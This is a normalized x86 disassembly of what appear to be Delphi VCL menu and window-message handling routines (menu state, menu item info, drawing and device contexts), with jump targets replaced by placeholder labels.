mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_46072c
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_460851
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_460584
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45f658
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46071c
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_460880
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42c344
xor eax eax
push ebp
push sub_46097e
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42c344
xor eax eax
push ebp
push sub_460953
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_46072c
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42c33c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460985
mov eax [ rw-data ]
call sub_42c33c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_460584
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4609a4
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_460d28
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_460d28
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_460a60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_460ffc
mov eax ebx
call sub_408a58
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_460b00
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_460a60
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4042a8
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4044f8
lea edx [ ebp - 0x200 ]
call sub_408b1c
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_460b94
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_460c04
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4610a4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4610a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4610a4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_460c10
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_460b00
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_460b94
mov eax ebx
call sub_4610c8
jmp r-xdata
sub_460c78
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_460cc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_45aef0
mov eax ebx
call sub_4604d4
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_45af34
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_421018
sub_460cfc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421264
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_460cc0
sub_460d40
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_460584
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_460584
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_464224
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_460d9c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_460e71
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_460584
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_460584
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45f130
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f140
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404220
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404220
mov eax [ ebp - 0xc ]
pop edx
call sub_40810c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_461be8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460e78
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40405c
retn
sub_460e84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_460d40
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_460d9c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_460ffc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_460708
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_460584
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_460584
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408afc
mov eax [ ebp + 0x10 ]
call sub_408a40
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4610c8
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_4496d4
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4610a4
mov [ ebx + 0x41 ] 0x1
sub_4610f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4610a4
mov [ ebx + 0x41 ] 0x1
sub_46117c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_460c78
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_460b00
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_46120c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_461248
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403788#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461294
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4617c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4617ce
lea eax [ ebp - 0x30 ]
call sub_404038
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ esi + 0x4 ]
call sub_460640
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46d8d8
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov dx [ esi + 0x4 ]
call sub_460624
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4615fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4615dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4255f0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42546c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_461a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4615e4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4255f0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_460e84
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_460584
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_460584
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_46173d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_461718
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4616fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_4255f0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42546c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461702
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4255f0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_449958
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d8d8
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_460584
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_460584
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_460584
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_4605b4
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188d4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_4605b4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46d57c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46d5e4
jmp r-xdata
sub_46171f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_4617d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418778
pop esi
pop ebx
retn
push ebx
push sub_461248
call sub_4220a8
mov [ ebx + 0x10 ] eax
sub_46181c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46039c
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_4617d8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_461890
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461800
mov edx ebx
and dl 0xfc
mov eax esi
call sub_460438
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4618e8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_45c734
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_4610a4
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4610a4
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_461930
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
